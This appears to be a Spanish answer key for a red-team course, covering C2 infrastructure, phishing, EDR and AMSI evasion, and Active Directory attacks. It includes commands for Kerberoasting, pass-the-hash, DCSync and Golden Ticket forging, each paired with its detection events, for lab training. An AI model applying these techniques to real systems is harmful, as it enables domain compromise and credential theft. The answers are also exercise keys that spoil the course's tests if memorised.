# Soluciones — Parte 7: Red Team y operaciones ofensivas

> 🎓 **Intenta resolverlo tú primero.** Estas claves sirven para **verificar** tu trabajo, no para
> copiar. En Red Team el valor está en el razonamiento y en el rastro que dejas, no en el comando.
>
> ⚠️ **Marco ético y legal.** Todo lo de esta parte se practica **exclusivamente en tu propio
> laboratorio** (un AD de pruebas tipo GOAD, VMs que tú controlas) o bajo un **contrato con
> autorización escrita** y reglas de enfrentamiento (RoE). Atacar sistemas ajenos es delito. Cada
> solución incluye el **ángulo defensivo** (qué evento delata la técnica): esa es la mitad que
> convierte un ejercicio ofensivo en aprendizaje de seguridad real. Ver
> [Clase 025 — Ética, legalidad, alcance](../classes/parte-0-fundamentos-y-prerrequisitos/025-etica-legalidad-alcance-y-divulgacion-responsable/README.md).

Índice de la parte: [classes/parte-7](../classes/parte-7-red-team-y-operaciones-ofensivas/README.md).

---

## Clase 161 — Red Team vs Pentest: filosofía y objetivos

### Solución del reto verificable

El "Operation Charter" de una página para ACME Corp se acepta si un tercero ajeno lo lee y sabe **qué
está autorizado, qué se persigue y cómo se mide**. Estructura mínima:

- **Objetivo de negocio:** una frase orientada a impacto, no a técnica. Ej.: *"Determinar si un
  atacante con un correo comprometido puede acceder a la base de datos de pagos en menos de 5 días
  sin ser detectado."*
- **3 flags:** objetivos concretos y verificables (ej. leer un registro de la tabla `payments`,
  obtener `Domain Admin`, exfiltrar un fichero-señuelo marcado).
- **Tipo de inicio:** *assumed breach* (se entrega un foothold) o *black-box* desde cero; se declara
  explícitamente para no gastar tiempo/presupuesto en la fase de acceso si el objetivo es el impacto
  interno.
- **6 RoE:** ventana horaria permitida, sistemas/segmentos dentro y fuera de alcance, prohibición de
  DoS/destrucción de datos, manejo de datos sensibles hallados, límite de ingeniería social,
  requisito de no afectar producción crítica.
- **Plan de deconfliction:** contacto 24/7 del cliente + palabra clave para pausar, para distinguir
  el ejercicio de un incidente real.
- **3 métricas de éxito:** p. ej. TTD (time-to-detect) del SOC, número de controles evadidos,
  cobertura ATT&CK ejercida.

**Criterio cumplido cuando:** no hay ambigüedad sobre alcance, objetivos ni medición.

### Claves de los ejercicios

1. **5 diferencias pentest vs Red Team:** objetivo (cobertura de vulnerabilidades vs objetivo de
   negocio/impacto), sigilo (ruidoso y exhaustivo vs sigiloso y selectivo), alcance (amplio vs
   estrecho y profundo), evalúa al **SOC/detección** (no en pentest, sí en Red Team), duración y
   conocimiento del defensor (anunciado vs normalmente no).
2. Objetivo de negocio p. ej. *"comprobar si se puede llegar al panel de administración de pedidos"*;
   flags: acceso al panel admin, lectura de un pedido de prueba, obtención de una credencial de BD.
3. **8 cláusulas de RoE:** alcance in/out, ventana temporal, técnicas prohibidas (DoS,
   destrucción), manejo de datos reales, límites de ingeniería social/físico, contactos de
   deconfliction, requisitos de evidencia/logging, cláusula de "parada de emergencia". Justificar dos
   (p. ej. la de datos reales protege privacidad; la de parada evita daño a producción).
4. **Assumed breach** es mejor cuando el objetivo es medir la detección y el blast radius interno, no
   la resistencia del perímetro; ahorra semanas de fase de acceso. Ej.: cliente que ya asume que el
   phishing funciona y quiere saber "¿y después qué?".
5. Tabla de métricas: TTD objetivo (< X horas), TTR (< Y horas), cobertura ATT&CK (≥ N técnicas
   detectadas de las ejercidas). Los valores "razonables" dependen de la madurez del SOC.
6. **Deconfliction:** procedimiento acordado para confirmar rápido si una alerta es del equipo Red o
   un atacante real (canal directo + identificador de la operación), evitando activar respuesta a
   incidentes innecesaria.

---

## Clase 162 — MITRE ATT&CK como lenguaje ofensivo

### Solución del reto verificable

El *layer* de Navigator del grupo elegido (APT29, FIN7 o Wizard Spider) se acepta si el JSON importa
sin error y **cada técnica marcada existe en el perfil del grupo** según su página oficial en
attack.mitre.org. Proceso: abre la página del grupo (p. ej. APT29 = G0016), copia sus técnicas
asociadas, y en Navigator crea un layer nuevo, marca ≥15 técnicas con `score`/color y añade un
comentario por técnica (el procedimiento concreto del grupo). Exporta a JSON.

**Criterio cumplido cuando:** el fichero carga limpio y las técnicas son trazables a la CTI del grupo.

### Claves de los ejercicios

1. IDs: **Kerberoasting = T1558.003**, **Pass-the-Hash = T1550.002**, **LSASS dumping = T1003.001**
   (OS Credential Dumping: LSASS Memory), **phishing con adjunto = T1566.001** (Spearphishing
   Attachment).
2. **Técnica vs procedimiento:** la técnica es el "cómo" general (T1059.001, PowerShell); el
   procedimiento es la implementación concreta (p. ej. `powershell -enc <base64>` descargando de una
   URL). Distintos actores usan la misma técnica con procedimientos distintos.
3. Layer con 10 técnicas → exportar JSON desde Navigator (botón de exportación de la capa).
4. **Data Sources** (ejemplos): Kerberoasting → *Logon Session*/eventos Kerberos (4769);
   PowerShell → *Script Block Logging* (Command execution); LSASS dumping → *Process Access*;
   creación de servicio → *Service creation* (7045); PtH → *Logon* (4624 tipo 9).
5. **Tácticas exclusivas de ICS:** p. ej. **Impair Process Control** e **Inhibit Response Function**
   (no existen en Enterprise).
6. `T1059` (Command and Scripting Interpreter) tiene varias subtécnicas (PowerShell, Windows Command
   Shell, Unix Shell, VBS, Python, JavaScript, AppleScript, Network Device CLI, Cloud API…); cuéntalas
   con la API STIX/`attackcti` para dar el número vigente.

---

## Clase 163 — Emulación de adversarios

### Solución del reto verificable

El plan de emulación de una página se acepta si tiene **≥10 TTPs en 5 fases**, cada TTP con **ID
ATT&CK válido**, continuidad lógica (cada fase habilita la siguiente) y una herramienta de
reproducción por TTP más su detección esperada. Estructura recomendada por fases: Acceso inicial →
Ejecución/Persistencia → Escalada/Credenciales → Movimiento lateral → Acción sobre el objetivo. Basa
los TTPs en CTI pública del actor y anota, por cada uno, la herramienta (Atomic Red Team, Caldera,
comando manual) y la fuente de datos que lo detectaría.

**Criterio cumplido cuando:** hay encadenamiento causal entre fases y las herramientas reproducen de
verdad el comportamiento descrito en la CTI.

### Claves de los ejercicios

1. **Emulación vs simulación:** emular = ejecutar los TTPs **reales** del adversario en el entorno
   (comportamiento auténtico); simular = representar el ataque sin ejecutarlo de verdad (tabletop,
   tráfico sintético). Ej.: emular APT29 corriendo sus comandos vs simularlo con un ejercicio de mesa.
2. Extraer 8 TTPs de un informe CTI y mapear a ATT&CK: cita el ID por cada comportamiento descrito.
3. Ordenar en fases por dependencia (no puedes hacer movimiento lateral sin credenciales antes).
4. Herramienta por TTP: p. ej. Atomic Red Team para técnicas puntuales, Caldera para cadenas.
5. Criterio de detección por fase: la fuente de datos + la señal concreta (evento, log, telemetría).
6. Comparar dos planes de la MITRE Emulation Library (p. ej. APT29 vs FIN6): una diferencia de estilo
   suele ser sigilo/living-off-the-land vs uso de herramientas propias y ritmo.

---

## Clase 164 — Diseño de infraestructura de comando y control (C2)

### Solución del reto verificable

La cadena **víctima → redirector (TLS válido) → team server** se acepta si: una petición a la URI
"buena" de tu perfil llega al team server; navegar a la raíz del redirector devuelve un sitio benigno;
y el team server **nunca** es alcanzable directamente desde la víctima. Se logra con un redirector
(Nginx/Apache/`socat`) que solo reenvía las rutas del perfil de tráfico (malleable/HTTP) al backend y
manda el resto a un `return 302` de un sitio inocuo, con un certificado válido (Let's Encrypt) en el
redirector. El team server escucha solo en la red interna/hacia el redirector.

**Criterio cumplido cuando:** el filtrado por URI funciona y hay aislamiento del team server.

### Claves de los ejercicios

1. Arquitectura: víctima → 2 redirectores (uno HTTP, otro DNS o de respaldo) → team server, con host
   de **staging** separado del de **C2** y del de **exfil** (si cae uno, no cae todo).
2. Regla Nginx (idea): `location = /jquery-3.6.0.min.js { proxy_pass https://TEAMSERVER; }` y un
   `location / { return 302 https://sitio-benigno; }` para todo lo demás.
3. **Certificado autofirmado = mal OPSEC:** dispara alertas de TLS anómalo/inspección y es un IOC
   trivial; un cert válido de una CA reconocida se mimetiza con el tráfico legítimo.
4. Canales: **HTTPS** (fiable y mimético, el estándar), **DNS** (muy sigiloso pero lento y con poco
   ancho de banda, útil en redes muy restringidas), **SMB** (para pivoting interno peer-to-peer, sin
   salida directa a internet).
5. Plan de rotación: dominios de reserva pre-registrados y "calentados", DNS con TTL bajo, y cambio de
   redirector ante bloqueo sin tocar el team server.
6. **Domain fronting** está muy limitado hoy porque los grandes CDN (p. ej. las nubes de Google/AWS/
   Azure) desactivaron la disparidad entre SNI y Host; resume el estado actual del CDN que investigues.

---

## Clase 165 — Frameworks C2: Cobalt Strike, Sliver y Mythic

### Solución del reto verificable

La sesión C2 con **Sliver** se acepta si aparece en `sliver > sessions`/`beacons`, atraviesa el
redirector de la Clase 164 (el team server no es alcanzable directo desde la víctima) y está en modo
**beacon con jitter**. Genera el implante (`generate beacon --http tu-redirector --seconds 60 --jitter
30`), ejecútalo en tu VM de lab y confirma el check-in. Documenta ≥4 IOCs: p. ej. patrón de
beaconing periódico, User-Agent por defecto, URIs del perfil, certificado/JA3 del handshake, y el
proceso/hijo anómalo que hace la conexión.

**Criterio cumplido cuando:** la sesión existe, pasa por el redirector y entregas la lista de IOCs con
la fuente de datos que los revela.

### Claves de los ejercicios

1. **Sesión interactiva** = comunicación en tiempo real (útil en fase activa, más ruidosa);
   **beacon** = check-ins periódicos con jitter (sigiloso, para persistencia a largo plazo).
2. Implantes HTTPS vs mTLS: el HTTPS se mimetiza con tráfico web; el mTLS autentica ambos extremos
   (más robusto contra takeover) pero su handshake es más atípico. Compara sus capturas.
3. Agente en Mythic (p. ej. Apollo/Medusa) → `help`/lista de comandos del agente en la consola.
4. Jitter alto → los intervalos de check-in dejan de ser regulares; la detección por periodicidad se
   degrada.
5. Tabla CS vs Sliver vs Mythic: **licencia** (comercial vs open-source vs open-source), **canales**
   (HTTP/DNS/SMB/mTLS según el caso), **extensibilidad** (Aggressor/BOF vs extensiones Go vs agentes/
   contenedores modulares de Mythic).
6. **5 IOCs por defecto de Sliver:** User-Agent y URIs por defecto, certificados/JA3 característicos,
   nombres de pipe por defecto en el canal SMB, patrón de beacon sin jitter, y strings/exports del
   binario Go sin ofuscar (`sliver` en símbolos si no usas ofuscación).

---

## Clase 166 — Phishing y entrega de payloads

### Solución del reto verificable

La campaña con **GoPhish** en tu lab se acepta si: GoPhish reporta ≥1 clic desde un buzón que tú
controlas; el correo pasa **SPF/DKIM** (no cae en spam); y documentas por qué el método de entrega
evade el **Mark-of-the-Web (MOTW)**. Monta un dominio de pruebas con registros SPF/DKIM/DMARC válidos,
crea la plantilla, la landing y el sending profile en GoPhish, y usa un contenedor (ISO/IMG) o HTML
smuggling como entrega (no propaga MOTW a los ficheros internos).

**Criterio cumplido cuando:** hay clic registrado, autenticación de correo correcta y explicación del
bypass de MOTW. Todo sobre buzones propios.

### Claves de los ejercicios

1. Dos pretextos + evaluación de credibilidad (contexto, remitente plausible, llamada a la acción no
   sospechosa) y de riesgo (detectabilidad, impacto si falla).
2. SPF/DKIM/DMARC en un dominio de prueba → validarlos (p. ej. con un mail-tester o cabeceras
   `Authentication-Results`).
3. **ISO/contenedor evade MOTW** porque el flag `Zone.Identifier` no se propaga a los ficheros
   *dentro* del contenedor montado; al extraerse no quedan "marcados como de internet".
4. **HTML smuggling:** el HTML lleva el payload como blob en JavaScript y lo reconstruye/descarga en
   el cliente (`Blob` + `a.download`), evitando que un proxy vea el fichero en tránsito.
5. Campaña GoPhish + explicación de cada métrica (enviados, abiertos —pixel—, clics, datos enviados,
   reportados).
6. 3 reglas éticas propias: consentimiento/autorización, minimización de datos personales, y no
   avergonzar públicamente a quien pica (formación, no castigo).

---

## Clase 167 — Acceso inicial: técnicas

### Solución del reto verificable

El foothold **sin phishing** se acepta si hay una sesión C2 activa originada por el vector elegido
(servicio expuesto vulnerable o **Valid Accounts**), con su ID ATT&CK y explicación de cómo evitaste
ruido. En el lab: explota un servicio deliberadamente vulnerable (T1190) o usa credenciales válidas
obtenidas por spraying controlado (T1078), lanzando el implante contra tu redirector.

**Criterio cumplido cuando:** la sesión existe, citas el ID ATT&CK y justificas el control del ruido
(p. ej. una sola contraseña por ventana de lockout).

### Claves de los ejercicios

1. 6 técnicas de Initial Access: Spearphishing (**T1566**), Exploit Public-Facing App (**T1190**),
   Valid Accounts (**T1078**), External Remote Services (**T1133**), Supply Chain Compromise
   (**T1195**), Drive-by Compromise (**T1189**).
2. `Valid Accounts` es más sigiloso porque **se ve como un login normal**: no hay exploit ni crash,
   solo un 4624 legítimo; explotar un servicio deja errores/crashes y firmas.
3. Password spraying sin bloqueos: **una** contraseña por cuenta por ventana de lockout (si el umbral
   es 5 intentos/30 min, prueba 1 cada 30–60 min); calcula el timing desde la política del dominio.
4. **T1190 vs T1078:** T1190 (explotar servicio) es más detectable (WAF, IDS, crashes); T1078 (cuentas
   válidas) casi no genera señal salvo por anomalías de geolocalización/hora.
5. Foothold por dos vectores → comparar detectabilidad y fiabilidad de cada uno.
6. Caso real de supply chain (p. ej. un incidente público de dependencia comprometida): resume la
   cadena hasta el acceso.

---

## Clase 168 — Evasión de defensas: antivirus y EDR

### Solución del reto verificable

Se acepta si, partiendo de un implante que tu EDR de lab detecta, aplicas **≥2 técnicas de evasión** y
demuestras (capturas de la consola del EDR/Sysmon) que la línea base alertaba y tras las técnicas
cambia el resultado, **más** qué fuente de datos aún podría detectarte. Técnicas típicas en lab:
unhooking de `ntdll`, ejecución en memoria, syscalls indirectas. La clave educativa es el **"qué queda
detectable"** (ETW-TI, telemetría de kernel, comportamiento de red).

**Criterio cumplido cuando:** hay cambio demostrado en la telemetría y análisis honesto de la
detección residual. Solo en tu laboratorio.

### Claves de los ejercicios

1. **Firma vs comportamiento:** la firma matchea bytes/hashes conocidos (evadible cambiando el
   binario); la comportamental mira la cadena de acciones (p. ej. Word → PowerShell → conexión), más
   difícil de evadir.
2. Un EDR pone un **hook** (jmp a su DLL) en funciones de `ntdll`; el **unhooking** restaura los bytes
   originales desde una copia limpia del disco para que las llamadas no pasen por el EDR.
3. **Syscalls directas vs indirectas:** las directas ejecutan `syscall` desde tu módulo (delatan un
   origen anómalo); las indirectas saltan a la instrucción `syscall` dentro de `ntdll` (más sigilosas
   porque el retorno parece legítimo).
4. La ejecución **en memoria** no toca disco → no hay eventos de creación/escritura de fichero que
   registrar; se reduce la telemetría de disco.
5. **ETW-TI** (Threat Intelligence) emite eventos desde el kernel sobre operaciones sensibles (p. ej.
   asignaciones RWX, manipulación de memoria remota); es más difícil de cegar que el ETW en modo
   usuario, que un implante puede parchear en su propio proceso.
6. Contramedidas de tres técnicas: unhooking → monitorizar integridad de `ntdll`/ETW-TI; syscalls
   directas → detectar `syscall` fuera de `ntdll`; inyección → *Process Access*/`CreateRemoteThread`.

---

## Clase 169 — Ofuscación de payloads y bypass de AMSI

### Solución del reto verificable

Se acepta si, en tu VM, tomas un script que Defender bloquea, consigues ejecutarlo aplicando una
técnica de bypass de AMSI, y entregas **cómo lo detectaría el Blue Team** (regla o indicadores). El
foco educativo es la parte defensiva: **Script Block Logging** (evento 4104) capta el contenido aunque
AMSI se evada, y ciertos patrones (reflexión sobre `System.Management.Automation`, strings de parcheo)
son detectables.

**Criterio cumplido cuando:** demuestras la ejecución tras el bypass y entregas indicadores de
detección concretos.

### Claves de los ejercicios

1. **Ventaja de AMSI sobre el escaneo en disco:** inspecciona el contenido **en el momento de
   ejecución** (ya desofuscado/en memoria), así que ve scripts que nunca tocan el disco o que se
   descifran al vuelo.
2. Ofuscar un script de prueba (concatenación/base64) y evaluar si evade la firma **estática** (suele
   sí) pero no la de comportamiento.
3. **AMSI memory patch (lógica):** localizar `AmsiScanBuffer` en `amsi.dll` en el proceso y sobrescribir
   su prólogo para que devuelva "limpio" (`AMSI_RESULT_CLEAN`) sin escanear. (Concepto; no se incluye
   payload operativo.)
4. **Downgrade a PS v2** evade AMSI porque AMSI se introdujo en PowerShell v3+; forzar v2 (si el motor
   está instalado) ejecuta sin la interfaz. Mitigación: **desinstalar PowerShell v2** del sistema.
5. **4 IOCs de un intento de bypass:** eventos 4104 con strings de parcheo/reflexión, carga de
   `amsi.dll` seguida de escritura en su memoria, uso de `-Version 2`, y errores/telemetría de AMSI que
   deja de reportar de golpe.
6. Los bypass públicos "caducan" porque sus strings/patrones se **firman** rápidamente; hay que
   entender el mecanismo y adaptarlo, no copiar.

---

## Clase 170 — Active Directory: enumeración

### Solución del reto verificable

El mapa del dominio se acepta si incluye **usuarios privilegiados, cuentas con SPN, GPOs relevantes,
confianzas y ≥1 relación ACL abusable**, cada dato verificable en el lab, más un fichero de recolección
listo para BloodHound. Herramientas: `SharpHound`/`bloodhound-python` con `-c All`, consultas LDAP
(`ldapsearch`, PowerView `Get-DomainUser`/`Get-DomainGPO`/`Get-DomainTrust`).

**Criterio cumplido cuando:** entregas el documento/diagrama con los cinco elementos y el `.zip`/JSON
importable.

### Claves de los ejercicios

1. Miembros de "Domain Admins" con dos herramientas (p. ej. `net group "Domain Admins" /domain` y
   `Get-DomainGroupMember` de PowerView) para contrastar.
2. 3 cuentas con SPN → interesantes porque son **kerberoasteables** (Clase 171): un usuario cualquiera
   puede pedir su TGS y crackearlo offline.
3. LDAP: filtrar `userAccountControl` con `PASSWD_NOTREQD` (0x20) o `DONT_REQUIRE_PREAUTH` (0x400000,
   AS-REP roasteable).
4. GPOs del dominio y sus OUs vinculadas (`Get-DomainGPO` / `gpresult`).
5. Confianzas del forest (`Get-DomainTrust` / `nltest /domain_trusts`) y su dibujo (dirección y tipo).
6. **Ruido:** PowerView hace muchas consultas LDAP amplias (más telemetría 4662/1644); consultas LDAP
   puntuales y dirigidas generan menos señal.

---

## Clase 171 — Active Directory: Kerberoasting y ataques a Kerberos

### Solución del reto verificable

Se acepta si obtienes en claro la contraseña de una **cuenta de servicio con SPN** (Kerberoasting +
crackeo offline), muestras el comando de solicitud y el de crackeo, e identificas el evento **4769 con
etype RC4** en el DC. Flujo: `GetUserSPNs.py`/Rubeus solicita el TGS del SPN → se exporta el hash →
`hashcat -m 13100` con diccionario. El crackeo es **offline**, así que no genera tráfico adicional
contra el DC.

**Criterio cumplido cuando:** tienes la contraseña, los dos comandos y el 4769 RC4 correspondiente.

### Claves de los ejercicios

1. **Flujo Kerberos:** AS-REQ/AS-REP (TGT) → TGS-REQ/TGS-REP (ticket de servicio). El **TGS** va
   cifrado con el hash NT de la cuenta de servicio, así que es crackeable offline si la contraseña es
   débil.
2. Kerberoasting + crackeo de ≥1 cuenta del lab.
3. **AS-REP Roasting** contra una cuenta con `DONT_REQUIRE_PREAUTH` (`GetNPUsers.py`, hashcat `-m
   18200`).
4. RC4 vs AES: RC4 (etype 23) se crackea mucho más rápido que AES (etype 17/18); por eso los atacantes
   fuerzan RC4 y su presencia es un IOC.
5. **gMSA** mitiga porque su contraseña es de 240+ bytes, aleatoria y **rotada automáticamente** por el
   dominio: inviable de crackear.
6. Regla de detección: 4769 con `Ticket Encryption Type = 0x17` (RC4) y volumen anómalo de SPNs
   solicitados por un mismo usuario en poco tiempo.

---

## Clase 172 — Active Directory: Pass-the-Hash y Pass-the-Ticket

### Solución del reto verificable

Se acepta si, partiendo de admin local en una máquina, obtienes **ejecución en dos máquinas destino
distintas**, una vía **PtH** y otra vía **PtT**, sin contraseñas en claro, mostrando comandos y el
material reutilizado (hash/ticket). PtH: `crackmapexec smb <host> -u <user> -H <NThash>` o
`impacket-wmiexec -hashes`. PtT: exportar un TGT/TGS (`Rubeus`/`ticket.kirbi`) e inyectarlo antes de
acceder.

**Criterio cumplido cuando:** hay ejecución en dos destinos por las dos vías, con evidencia del
material reutilizado. Solo en tu laboratorio.

### Claves de los ejercicios

1. **NTLM permite PtH** porque autentica con el **hash** directamente (el hash *es* el secreto);
   Kerberos usa tickets con marcas de tiempo y claves, así que no se "pasa el hash" tal cual (pero sí
   se hace Overpass-the-Hash para pedir un TGT con el hash).
2. PtH a una segunda máquina del lab.
3. **Overpass-the-Hash:** usar el hash para pedir un TGT y confirmarlo con `klist`.
4. Robo e inyección de un TGT para una tercera máquina.
5. **Credential Guard** aísla los secretos de LSASS en un entorno virtualizado (VSM/VBS), de modo que
   `mimikatz` no puede leer los hashes/tickets desde el LSASS normal.
6. **Tiering de Microsoft:** separa cuentas por nivel (Tier 0 = DC/identidad, Tier 1 = servidores,
   Tier 2 = estaciones) y prohíbe que una credencial de Tier 0 se use en Tier 2, cortando el
   movimiento lateral y la cosecha de credenciales privilegiadas.

---

## Clase 173 — BloodHound y análisis de rutas de ataque

### Solución del reto verificable

Se acepta si documentas una **ruta completa** de un usuario de bajo privilegio a Domain Admins,
explicando el abuso de **cada arista**, con el grafo resaltado, la lista ordenada de aristas con su
técnica concreta y cuál es el **salto más ruidoso**. Recolecta con `-c All`, marca tu usuario como
"Owned" y usa "Shortest paths to Domain Admins".

**Criterio cumplido cuando:** presentas grafo + aristas en orden + técnica de abuso por arista + salto
más ruidoso identificado.

### Claves de los ejercicios

1. Recolectar con dos collectors (SharpHound C# vs `bloodhound-python`) y comparar cobertura/ruido.
2. Camino más corto de tu usuario a DA (query integrada).
3. **Abuso de `WriteDACL` sobre un grupo:** te concedes a ti mismo permiso para añadirte al grupo (p.
   ej. `Add-DomainGroupMember`), heredando sus privilegios.
4. Cypher para Unconstrained Delegation:
   `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name`.
5. Priorizar rutas por sigilo: preferir aristas que usan funciones legítimas (ACL, delegación) frente
   a las que disparan credenciales/servicios ruidosos; justifícalo.
6. **Uso defensivo:** identificar una arista peligrosa (p. ej. un grupo con `GenericAll` sobre un DA) y
   recomendar quitarla.

---

## Clase 174 — Compromiso total de dominio: DCSync y Golden Ticket

### Solución del reto verificable

Se acepta si logras **acceso total al DC** vía DCSync + Golden Ticket: muestras el hash de **krbtgt**
obtenido por DCSync (`secretsdump.py`/mimikatz `lsadump::dcsync /user:krbtgt`), el comando de forja del
Golden Ticket (con el hash de krbtgt, SID del dominio y RID 500), una acción con éxito sobre el DC
usando ese ticket, e identificas el **evento 4662** que delató la replicación.

**Criterio cumplido cuando:** hash de krbtgt + comando de forja + acción con éxito + evento 4662
identificado. Todo en tu laboratorio.

### Claves de los ejercicios

1. El hash de **krbtgt** cifra todos los TGT del dominio; con él puedes **forjar un TGT** para
   cualquier usuario/grupo (incluido un Domain Admin inexistente), de ahí el "golden".
2. DCSync para extraer el hash de krbtgt del lab.
3. Forjar el Golden Ticket y acceder al DC.
4. **Silver Ticket** (forja un TGS para un servicio concreto con el hash de esa cuenta de servicio):
   más **sigiloso** que el Golden porque **no toca el DC** (no pide TGS), pero su alcance es limitado a
   ese servicio.
5. Hay que **resetear krbtgt dos veces** (con margen) porque el sistema mantiene la contraseña actual y
   la anterior; un solo reset deja la clave vieja aún válida para los tickets forjados.
6. Detección por **evento 4662** con el GUID de la operación de replicación (`DS-Replication-Get-
   Changes`) desde un principal que **no** es un DC.

---

## Clase 175 — Persistencia en Active Directory

### Solución del reto verificable

Se acepta si instalas **dos técnicas de persistencia distintas**, demuestras que sobreviven a un
"reinicio"/cambio de contraseña de la cuenta original, y luego, como Blue Team, presentas los
eventos/consultas que las detectan y el procedimiento que las erradica por completo. Ejemplos: ACL
DCSync sobre el dominio, AdminSDHolder, RBCD, cuenta oculta.

**Criterio cumplido cuando:** ambas persistencias dan acceso tras el cambio, y entregas detección +
erradicación completas. Solo en tu laboratorio.

### Claves de los ejercicios

1. Persistencia por **ACL DCSync** (conceder `DS-Replication-Get-Changes-All` a un principal
   controlado) y demostrarla.
2. **AdminSDHolder** es resistente porque **SDProp** reaplica su ACL a las cuentas protegidas cada ~60
   min; si te añades ahí, tu permiso se **reinyecta** aunque lo borren de la cuenta.
3. **DCShadow** registra un DC falso y replica cambios maliciosos como si fueran replicación legítima →
   sigiloso porque evita los logs normales de modificación.
4. **RBCD** (Resource-Based Constrained Delegation): configurar `msDS-AllowedToActOnBehalfOfOtherIdentity`
   para impersonar a un admin en un recurso.
5. **Golden vs Diamond Ticket:** el Golden se forja **offline** (no pide nada al DC, pero puede tener
   campos PAC inconsistentes); el **Diamond** modifica un TGT **real** solicitado al DC (más difícil de
   detectar por anomalías de PAC).
6. Checklist de erradicación: rotar krbtgt (x2), auditar y limpiar ACLs (dominio, AdminSDHolder),
   revisar RBCD y delegaciones, cuentas/SPN sospechosos, y GPOs alteradas.

---

## Clase 176 — OPSEC ofensiva

### Solución del reto verificable

La **matriz OPSEC** de ≥8 acciones se acepta si cada fila tiene **acción, telemetría concreta
(evento/fuente de datos) y alternativa más sigilosa**, y al menos una fila se apoya en un evento que
capturaste tú mismo en Sysmon. Ej. de fila: *Dump de LSASS → Sysmon 10 (Process Access a lsass.exe) →
usar un método que no abra un handle directo / clonar el proceso*.

**Criterio cumplido cuando:** las 8 filas están completas y ≥1 está respaldada por telemetría real de
tu lab.

### Claves de los ejercicios

1. **OPSEC** = proteger la operación de la detección/atribución; mala OPSEC = p. ej. beacon sin jitter
   con User-Agent por defecto desde una IP atribuible.
2. Matriz "acción → telemetría → alternativa" con 8 filas.
3. El **jitter** rompe la periodicidad del check-in, degradando la detección por análisis de intervalos
   regulares (beaconing).
4. Infraestructura que minimiza atribución: redirectores desechables, dominios sin relación entre sí,
   pago/registro no trazables al operador, separación por función.
5. Formato de entrada de cuaderno de operación: timestamp, host/usuario, comando exacto, resultado,
   IOCs generados, decisión (para deconfliction y reporte).
6. Plan de 5 pasos "cuando te queman": pausar el implante, rotar infraestructura, evaluar qué se
   expuso, cambiar TTPs y notificar al líder/deconfliction.

---

## Clase 177 — Red teaming físico

### Solución del reto verificable

El **kit de operación física** (teórico + práctico en tu entorno) se acepta si demuestras el HID
abriendo una sesión C2 en **tu propia máquina** y el dropbox estableciendo C2 en **tu lab**, y entregas
plan de recon, pretexto y **carta de autorización completa**. Nada se prueba fuera de tu propiedad.

**Criterio cumplido cuando:** HID y dropbox funcionan en tu equipo/lab y la documentación (recon,
pretexto, autorización) está completa.

### Claves de los ejercicios

1. Plan de recon físico de un edificio ficticio: horarios, accesos, control de acceso, puntos ciegos,
   OSINT del personal.
2. Dos pretextos presenciales + riesgos (ser interpelado, falta de credencial, cámaras).
3. **Clonado RFID:** las tarjetas de **125 kHz** (baja frecuencia, tipo EM4100) se clonan trivialmente;
   las de **13.56 MHz** (HF, MIFARE/DESFire) con cifrado son mucho más resistentes.
4. Payload HID que lanza una shell **en tu lab** (concepto de "teclado" que escribe comandos).
5. Dropbox que llama a casa por C2 (mini-PC/Raspberry con reverse C2 hacia tu redirector).
6. Plantilla de carta de autorización con 8 campos: alcance, fechas/horas, firmantes autorizados,
   direcciones/instalaciones, contactos de emergencia, límites, manejo de hallazgos, y "get-out-of-
   jail" con datos de contacto verificables.

---

## Clase 178 — Purple teaming

### Solución del reto verificable

El **ciclo purple completo** sobre ≥3 técnicas se acepta si, por cada técnica, presentas: ejecución →
observación en el SIEM → regla creada/afinada → **reejecución** que confirma la detección; y un layer
de Navigator con las 3 técnicas en verde con comentario. Es la unión de rojo (ejecuta) y azul (detecta
y mejora) en el mismo ciclo.

**Criterio cumplido cuando:** las 3 técnicas pasan de no-detectadas a detectadas con evidencia de
antes/después.

### Claves de los ejercicios

1. Diagrama del ciclo purple: planificar → ejecutar (rojo) → detectar/observar (azul) → afinar regla →
   reejecutar → medir.
2. Ciclo purple completo sobre **Pass-the-Hash** (ejecutar PtH → buscar 4624 tipo 9 / 4776 → regla →
   reejecutar).
3. Regla de detección de **DCSync** (evento 4662 con el GUID de replicación desde un no-DC).
4. Capa de cobertura Navigator con 5 técnicas.
5. Reducir un falso positivo: añadir exclusión de la cuenta/host legítimo que lo causaba y documentar
   el porqué.
6. Hallazgo accionable para el SOC a partir de una técnica no detectada: qué log falta, qué regla crear
   y con qué prioridad.

---

## Clase 179 — Reporte y métricas de Red Team

### Solución del reto verificable

El **informe completo** se acepta si un ejecutivo entiende el riesgo en la primera página y un ingeniero
puede reproducir y remediar cada hallazgo desde el detalle técnico; las métricas (TTD/TTR/dwell/
cobertura) están respaldadas por **timestamps reales** del cuaderno y hay una capa de cobertura en
Navigator adjunta. Estructura: resumen ejecutivo → narrativa del attack path con mapeo ATT&CK → tabla
de hallazgos → métricas → recomendaciones priorizadas.

**Criterio cumplido cuando:** doble audiencia satisfecha (ejecutiva y técnica) y métricas trazables.

### Claves de los ejercicios

1. Resumen ejecutivo de media página en **lenguaje de negocio** (riesgo, impacto, no jerga).
2. Narrativa de 3 pasos del attack path con evidencias (capturas, comandos, timestamps).
3. Tabla de 5 hallazgos con **severidad** (p. ej. CVSS/riesgo) y recomendación por cada uno.
4. **TTD/TTR** a partir de timestamps: TTD = detección − ejecución; TTR = respuesta/contención −
   detección.
5. Capa de cobertura ATT&CK del ejercicio (técnicas ejercidas vs detectadas).
6. Priorizar 6 recomendaciones en una **matriz impacto/esfuerzo** (quick wins primero: alto impacto,
   bajo esfuerzo).

---

## Clase 180 — Adversary emulation con Atomic Red Team y Caldera

### Solución del reto verificable

La **campaña automatizada** se acepta si presentas la salida de **≥5 tests atómicos** (con su
limpieza), una **operación de Caldera** con un perfil de **4+ abilities** encadenadas, y una capa de
Navigator que marca cada técnica emulada como detectada o no, con la regla pendiente para las no
detectadas. Atomic (`Invoke-AtomicTest T####`) para técnicas puntuales; Caldera para la cadena con su
planner.

**Criterio cumplido cuando:** 5 atómicos con cleanup + operación Caldera (4+ abilities) + layer de
cobertura con detectadas/no-detectadas.

### Claves de los ejercicios

1. 3 tests atómicos de técnicas distintas, con `-Cleanup` tras cada uno.
2. Por cada test, verificar si el SIEM lo detecta y anotarlo.
3. Desplegar un agente Caldera y confirmarlo en la consola.
4. Adversary profile con 4 abilities encadenadas (cada una habilita la siguiente).
5. Lanzar la operación y documentar la secuencia que eligió el **planner**.
6. Capa de cobertura en Navigator con lo emulado (verde = detectado).

---

## 🔗 Relacionado

